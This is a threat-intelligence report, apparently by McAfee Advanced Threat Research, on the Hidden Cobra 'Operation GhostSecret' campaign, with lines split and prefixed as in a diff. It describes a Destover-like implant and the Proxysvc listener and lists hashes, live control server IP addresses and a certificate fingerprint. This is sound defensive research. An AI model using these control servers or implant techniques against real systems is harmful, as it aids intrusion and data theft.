+This new variant resembles parts of the Destover malware, which was used in the 2014 Sony Pictures attack.
+Furthermore, the Advanced Threat Research team has discovered Proxysvc, which appears to be an undocumented implant.
+We have also uncovered additional control servers that are still active and associated with these new implants.
+Based on our analysis of public and private information from submissions, along with product telemetry, it appears Proxysvc was used alongside the 2017 Destover variant and has operated undetected since mid-2017.
+The attackers behind Operation GhostSecret used a similar infrastructure to earlier threats, including SSL certificates used by FakeTLS in implants found in the Destover backdoor variant known as Escad, which was used in the Sony Pictures attack.
+Based on our technical analysis, telemetry, and data from submissions, we can assert with high confidence that this is the work of the Hidden Cobra group.
+The Advanced Threat Research team uncovered activity related to this campaign in March 2018, when the actors targeted Turkish banks.
+These initial findings appear to be the first stage of Operation GhostSecret.
+For more on the global aspect of this threat, see “Global Malware Campaign Pilfers Data from Critical Infrastructure of Entertainment, Finance, Health Care, and Other Industries.”
+Analysis The McAfee Advanced Threat Research team discovered a previously unknown data-gathering implant that surfaced in mid-February 2018.
+This implant appears to be a derivative of implants authored before by Hidden Cobra and contains functionality similar to that of Bankshot, with code overlaps from other Hidden Cobra implants.
+However, the variant is not based on Bankshot.
+Our analysis of the portable executable’s rich-header data reveals that the two implants were compiled in different development environments.
+(The PE rich header is an undocumented part of a Windows executable that reveals unique information to identify the Microsoft compiler and linker used to create the program.
+It is helpful for identifying similarities between malware variants to establish common development environments.)
+Our analysis of the code and PE rich header indicates that Bankshot, Proxysvc, and the Destover-like implant are distinct families, but also contain overlapping code and functionality with current tools of Hidden Cobra.
+PE rich header data from the 2018 Bankshot implant.
+PE rich header data from the new February 2018 implant.
+PE rich header data from Proxysvc.dll.
+When we compared the PE rich header data of the new February 2018 implant with a variant of Backdoor.
+Escad (Destover) from 2014 shortly before the Sony Pictures attack, we found the signatures to be identical.
+The Destover-like variant is 83% similar in code to a 2015 variant and contains the same rich PE header signature as the Backdoor.
+Escad variant we analyzed.
+Thus the new implant is likely a derivative of components of Destover.
+We determined that the implant is not a direct copy of well-known previous samples of Destover; rather, Hidden Cobra created a new hybrid variant using functionality present in earlier versions.
+2014 Backdoor.
+Escad (hash: 8a7621dba2e88e32c02fe0889d2796a0c7cb5144).
+2015
+Destover variant (7fe373376e0357624a1d21cd803ce62aa86738b6).
+The February implant fe887fcab66d7d7f79f05e0266c0649f0114ba7c was obtained from an unknown submitter in the United States on February 14, two days after it was compiled.
+This Korean-language file used the control server IP address 203.131.222.83.
+The implant is nearly identical to an unknown 2017 sample (8f2918c721511536d8c72144eabaf685ddc21a35) except that the control server addresses are different.
+The 2017 sample used address 14.140.116.172.
+Both implants specifically use FakeTLS with PolarSSL, which we saw in previous Hidden Cobra implants.
+PolarSSL libraries have appeared in implants since the Sony Pictures incident and were used exclusively in the implant Backdoor.
+Destover.
+This implant incorporated a custom control server protocol that sends traffic over port 443.
+The implementation does not format the packets in standard SSL, but rather in a custom format and transmitted over SSL—hence, FakeTLS.
+The control server traffic when compared to Backdoor.
+Escad is nearly identical.
+TLS traffic in Backdoor.
+Destover, the 2018 Destover-like variant.
+TLS traffic in Backdoor.
+Escad.
+Further research into IP address 14.140.116.172 leads us to additional hidden components involved in the overall infrastructure.
+Proxysvc.dll contains a list of hardcoded IP addresses, including the preceding address, all located in India.
+Despite the name, this component is not an SSL proxy, but rather a unique data-gathering and implant-installation component that listens on port 443 for inbound control server connections.
+Proxysvc was first collected by public and private sources on March 22 from an unknown entity in the United States.
+The executable dropper for the component was submitted from South Korea on March 19.
+McAfee telemetry analysis from March 16 to 21 reveals that Proxysvc components were active in the wild.
+Our research shows this listener component appeared mostly in higher education organizations.
+We suspect this component is involved in core control server infrastructure.
+These targets were chosen intentionally to run Proxysvc because the attacker would have needed to know which systems were infected to connect to them.
+This data also indicates this infrastructure had been operating for more than a year before its discovery.
+The Advanced Threat Research team found this component running on systems in 11 countries.
+Given the limited capabilities of Proxysvc, it appears to be part of a covert network of SSL listeners that allow the attackers to gather data and install more complex implants or additional infrastructure.
+The SSL listener supports multiple control server connections, rather than a list of hardcoded addresses.
+By removing the dependency on hardcoded IP addresses and accepting only inbound connections, the control service can remain unknown.
+The number of infected systems by country in which Proxysvc.dll was operating in March.
+Source: McAfee Advanced Threat Research.
+The 2018 Destover-like implant appeared in organizations in 17 countries between March 14 and March 18.
+The impacted organizations are in industries such as telecommunications, health, finance, critical infrastructure, and entertainment.
+The number of infected systems by country in which the Destover variant was operating in March.
+Source: McAfee Advanced Threat Research.
+Control Servers
+Further investigation into the control server infrastructure reveals the SSL certificate d0cb9b2d4809575e1bc1f4657e0eb56f307c7a76, which is tied to the control server 203.131.222.83, used by the February 2018 implant.
+This server resides at Thammasat University in Bangkok, Thailand.
+The same entity hosted the control server for the Sony Pictures implants.
+This SSL certificate has been used in Hidden Cobra operations since the Sony Pictures attack.
+Analyzing this certificate reveals additional control servers using the same PolarSSL certificate.
+Further analysis of McAfee telemetry data reveals several IP addresses that are active, two within the same network block as the 2018 Destover-like implant.
+Number of infections by Thammasat University – hosted control servers from March 15 – 19, 2018.
+Source: McAfee Advanced Threat Research.
+Implant Origins McAfee Advanced Threat Research determined that the Destover-like variant originated from code developed in 2015.
+The code reappeared in variants surfacing in 2017 and 2018 using nearly the same functionality and with some modifications to commands, along with an identical development environment based on the rich PE header information.
